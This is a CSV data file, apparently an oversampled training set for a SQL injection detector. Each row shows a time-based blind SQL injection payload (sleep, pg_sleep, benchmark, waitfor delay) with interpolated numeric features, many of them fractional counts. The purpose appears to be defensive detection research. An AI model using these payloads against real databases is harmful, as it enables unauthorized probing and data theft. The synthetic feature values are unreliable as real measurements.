id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000259,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,0.386272853408213,75.23793620440483,26.917470919706343,3.8182016063154394,19.33011632117462,22.082529080293654,25.825290802936554,8.0,0.2568945976136092,0.29408936462873125,0.3424116480879417,0.1066043896697178,0.0,0.0,1.8349418394126893,0.0,0.0,1.0,0.0,4.165058160587311,0.0,0.0,1.0,2.8349418394126893,0.0,0.0,0.9174709197063446,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.08252908029365547,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0825290802936554
SMOTE_000260,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000044,0.48872071627037106,86.41890177174605,27.0,3.8552221499069548,19.887064412267577,28.209450885873025,29.435322061337878,8.887064412267575,0.23060252347122628,0.3259034899533462,0.34056223713841394,0.10293174943701355,0.0,0.0,2.0,0.0,0.0,1.887064412267575,0.0,4.0,0.0,0.0,1.0,3.8870644122675753,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8870644122675753,0.0,0.11293558773242474,0.8870644122675752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8870644122675753
SMOTE_000261,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000099,1.126276010280756,87.4236403333522,26.2709210000566,3.8102370552340368,22.0,27.0,30.0,8.4236403333522,0.25165620593864313,0.3088507981974256,0.3431675535526951,0.09632544231123613,0.0,0.4236403333521994,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.4236403333521994,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000262,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000105,0.00844068797411356,87.96859959890078,27.99790663992672,3.868717056843713,25.993719919780155,20.987439839560313,29.989533199633595,10.997906639926718,0.295495604509532,0.23856695428150548,0.34091234956424854,0.12502509164471398,3.9979066399267187,0.0,0.0,0.0,0.0,1.9979066399267187,0.0,4.0,0.002093360073281314,0.0,1.0,1.9979066399267187,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.002093360073281314,0.0,0.0,0.0,1.0,0.9979066399267187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000263,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,1.5392115929730528,93.75500819036229,27.52318256276021,3.7608732089869514,26.0,21.52318256276021,34.18546050208166,12.046365125520417,0.27827936031342754,0.23004877106580468,0.36336894840132206,0.12830292021944575,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.046365125520416,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.5231825627602078,0.47681743723979203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.47681210340407143,68.5803037390812,25.720202492720798,3.6494031449014943,22.440404985441596,10.0,27.8601012463604,8.279797507279202,0.32697429907698783,0.14584913539947036,0.4062579010330685,0.1209186644904733,0.13989875363960103,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.13989875363960125,1.0,0.0,3.0,0.13989875363960125,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,2.0174288331577896,78.59556201499701,24.781414728636094,3.602457084997665,23.562829457272187,13.12565891454437,30.12565891454437,11.781414728636094,0.30190926982595007,0.16348455029008319,0.3836515449709917,0.15095463491297503,3.6092926356819537,0.0,0.0,0.0,0.0,1.3907073643180463,0.0,4.390707364318047,0.0,0.0,0.39070736431804637,3.0,1.0,0.0,0.0,0.39070736431804637,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.39070736431804637,0.6092926356819536,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000266,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.036572364034251806,82.9620075981615,24.962007598161502,3.2342595019454485,29.981003799080753,2.0,39.0,11.981003799080751,0.361379150126408,0.024107973891059467,0.47010549087565984,0.1444073851068727,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.9905018995403756,0.0,0.0,1.0,0.0,1.0,0.0,0.9905018995403756,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.009498100459624292,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.009498100459624
SMOTE_000267,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000017,0.04091896353361124,59.033068573151894,22.977954284565406,3.620419502481833,20.96693142684811,10.0,22.06613714630378,6.0,0.3552089978534305,0.16940112473167881,0.3737492025758834,0.1016406748390073,0.9889771422827034,0.0,0.0,0.0,0.0,1.0,0.0,3.0110228577172964,0.0,0.0,0.0,1.0,0.9889771422827034,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.011022857717296608,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011022857717297
SMOTE_000268,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5579255825082552,66.0,24.953808809180106,3.5916585844247404,19.47690440459005,10.0,27.0,9.523095595409947,0.2951046121907584,0.15151515151515152,0.4090909090909091,0.144289327203181,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.5230955954099465,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.47690440459005334,0.5230955954099465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000269,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.1448645982221937,64.94310854409414,22.943108544094148,3.4898939455526525,19.0,10.0,27.0,8.943108544094146,0.2925675330918777,0.15398291215361984,0.4157538628147736,0.13769569193972891,0.0,0.9431085440941467,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.9431085440941469,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,1.483831435142065,76.94460000624736,26.0,3.546757062268296,15.563514286606765,21.436485713393235,31.38108571964059,8.563514286606765,0.20239170253914102,0.2794661398870315,0.4069127495477461,0.11122940802608133,0.43648571339323483,0.0,0.0,0.0,0.0,1.0,0.0,5.5635142866067655,0.0,0.0,1.0,1.0,0.4364857133932348,0.0,0.0,0.5635142866067651,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,0.8366580095468419,61.56919954006434,18.76153325667739,3.151788879964461,25.04613302670956,1.0,27.523066513354777,8.0,0.4063233619161875,0.016271456546904928,0.4472335291616679,0.13017165237523956,0.0,3.0,0.0,0.0,0.0,0.2384667433226102,0.0,4.76153325667739,0.0,0.0,0.0,0.2384667433226102,0.0,1.0,0.0,0.0,0.0,0.2384667433226102,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000272,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.4658473526661412,89.82145662766587,27.642913255331734,3.603831190529543,24.821456627665867,18.0,37.0,10.0,0.2763289239448541,0.20040122106142505,0.4119358432929292,0.11133401170079167,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.821456627665867,0.17854337233413295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000273,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000124,1.745733323615666,76.492947713222,24.915491285537,3.349902137668045,19.4577456427685,10.0,35.577456427685,11.4577456427685,0.25541047583325055,0.13152393057318515,0.46287426221886185,0.15019133137470242,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.9154912855370005,0.5422543572315,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4577456427685,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000097,1.7492480888321655,65.8457738429841,18.61525794766137,2.729003036478357,12.077113078507947,4.461031790645473,36.61525794766137,12.692371026169315,0.18458486095216858,0.06558359082931742,0.5564572880140402,0.19337426020447385,0.0,3.0771130785079475,0.0,0.0,0.0,1.0,0.0,6.307628973830684,1.692371026169316,0.0,0.3076289738306841,1.0,0.0,1.0,0.0,0.3076289738306841,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6923710261693159,0.3076289738306841,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,0.3496498579449718,91.3289796895946,22.263183751675683,2.9932430950853766,28.328979689594604,1.0657959379189208,46.86840812416216,15.06579593791892,0.31006475737688416,0.011636727410831854,0.5133428449963153,0.1649556702159687,0.2631837516756814,2.8026121862432385,0.0,0.0,1.0,1.0,0.0,8.93420406208108,1.0657959379189204,0.0,0.0,2.0,0.06579593791892063,0.9342040620810799,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000276,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.06246610174057873,68.80638285375514,25.845106283004107,3.6559209961059715,22.845106283004107,10.0,27.961276570751025,8.0,0.3319215416419645,0.14536598085653277,0.40641969281627655,0.1162927846852262,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,1.1346252346448236,83.30333498420177,20.0,2.938303564360681,28.955002476302663,2.0,42.0,10.348332507899112,0.34743324019793415,0.024011807495876364,0.5042479574134038,0.12430699489278567,0.3483325078991122,0.0,0.0,0.0,1.0,0.0,0.0,9.0,0.0,0.0,0.0,1.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.348332507899112
SMOTE_000278,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000085,0.16355863804861223,77.4946332609614,17.936829157620174,2.7813926561549733,22.0,1.9684145788100889,41.62097494572105,11.905243736430263,0.2843503036101839,0.025340585323669146,0.536737272292362,0.15357183877378489,0.0,3.968414578810088,0.0,0.0,0.0,0.03158542118991248,0.0,7.905243736430262,0.0,0.0,0.0,0.0315854211899127,0.0,1.0,0.0,0.0,0.0,0.03158542118991248,1.0,0.0,0.0,0.0,0.0,0.03158542118991248,0.0,0.0,0.0,1.0,0.9684145788100875,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000279,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,1.4486651408584201,94.64576631253689,28.0,3.8237960411397958,20.0,29.645766312536885,34.0,11.0,0.21131967231234738,0.31321106498487095,0.3592434429309906,0.11622581977179107,0.6457663125368861,0.3542336874631139,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.6457663125368861,0.3542336874631139,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.6457663125368861,0.3542336874631138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,0.04047912590985282,69.93292607214899,24.03832795877201,3.6089389597924026,22.009581989693,10.0,26.942508061841988,10.980836020613996,0.314772418524089,0.14300923793163495,0.3852123719684618,0.15700597157581425,3.990418010306998,0.0,0.0,0.0,0.0,1.0,0.0,3.990418010306998,0.0,0.0,0.0,2.990418010306998,1.0,0.0,0.0,0.009581989693001919,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.009581989693001836,0.990418010306998,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000281,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,0.6564358565525727,67.34025867384636,20.620036953406622,3.0471007779629575,21.189981523296687,1.8100184767033127,33.910203243736426,10.430055430109935,0.3176411414489782,0.026535912250392618,0.5013941109191532,0.15442883538147587,3.8100184767033114,0.0,0.0,0.0,0.0,1.0,0.0,5.620036953406623,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.18998152329668871,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1899815232966886
SMOTE_000282,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,1.5666716851926823,81.68280201000437,17.56658492461606,2.682914139118038,17.58353768845986,4.266339698464227,45.69975477384817,14.133169849232115,0.21816606107492054,0.04950815616514524,0.5599517587940216,0.17237402396591267,0.0,4.0,0.0,0.0,0.0,1.2832924623080284,0.0,8.0,0.5665849246160566,0.0,0.28329246230802846,1.2832924623080284,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000283,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.5908812327203211,56.23455097477351,22.074086768919866,3.688032513969423,23.0,3.691362256306622,18.54318871846689,11.0,0.40943153392302284,0.06597433596233286,0.3287790486731985,0.19581508144144572,5.691362256306622,0.0,0.0,0.0,0.0,1.0,0.0,2.308637743693378,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,3.5610806766655605,76.67162227726557,29.0,4.077799772476419,30.36998598229439,10.876671339235203,22.42496495573598,13.0,0.3973770540722388,0.14577555099150383,0.2846069474504201,0.17224044748583736,4.438335669617602,0.0,0.8766713392352029,0.0,0.0,1.0,0.0,2.6849929911471957,0.0,0.0,0.0,5.0,1.0,0.0,0.43833566961760145,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.5616643303823986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5616643303823987,0.0,0.4383356696176014,0.4383356696176014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,1.2496620569927845,66.67192297891341,19.52456042555906,2.8625411159872254,10.0,10.0,35.6228021277953,11.04912085111812,0.15134713525787394,0.1513471352578739,0.5326691519762655,0.16463657750798658,0.23771978722046994,0.76228021277953,0.0,0.0,0.0,1.0,0.0,6.52456042555906,0.7622802127795301,0.0,1.0,1.0,0.23771978722047016,0.7622802127795301,0.0,0.76228021277953,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.215678395741429,85.14260783020073,27.840306803553027,3.6417567438486507,27.04184082131816,10.0,35.52092041065908,12.579846598223487,0.31391716758412963,0.11856598133576149,0.4178037427307401,0.14971310834936874,4.0,0.0,0.0,0.0,0.0,1.5798465982234866,0.0,4.840306803553027,1.159693196446973,1.0,0.0,1.5798465982234864,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000287,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,2.4087757167564234,94.0,23.0,3.1645748424006084,29.402844081642087,5.726697142835134,45.5323853061193,13.338073469403476,0.3127962136344902,0.06092231003016099,0.4843870777246735,0.14189439861067527,0.0,1.8704587755227808,0.0,0.0,1.0,1.0,0.0,8.532385306119306,0.9352293877613904,0.0,0.0,2.0,0.0,0.4676146938806952,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.4676146938806953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.467614693880695
SMOTE_000288,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.42402750112832716,96.87451692525246,28.0,3.772010377548883,26.0,22.0,36.29961354020197,12.574903385050492,0.2688982589880191,0.22752929606678535,0.37389968191129286,0.1296727630339027,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.574903385050493,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,1.0433518120199372,72.0,23.950598356225225,3.530266983181584,16.366267762516518,19.633732237483482,28.0,8.0,0.22730927447939608,0.2726907255206039,0.3888888888888889,0.1111111111111111,0.3168661187417414,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.31686611874174164,0.0,0.0,0.6831338812582585,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
